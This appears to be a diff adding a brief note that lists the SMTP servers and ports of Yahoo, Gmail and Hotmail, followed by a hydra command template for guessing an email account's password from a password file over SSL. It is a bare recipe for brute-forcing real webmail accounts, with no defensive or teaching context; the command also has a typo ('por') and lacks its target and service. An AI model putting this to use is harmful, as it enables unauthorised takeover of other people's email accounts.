@@ -1,0 +1,13 @@
+Yahoo
+server: smtp.mail.yahoo.com	
+port: 465
+
+Gmail
+server: smtp.gmail.com
+port: 465
+
+Hotmail
+server: smtp.live.com
+port: 587
+
+hydra -l [email address] -P [password file] -s [por] -S
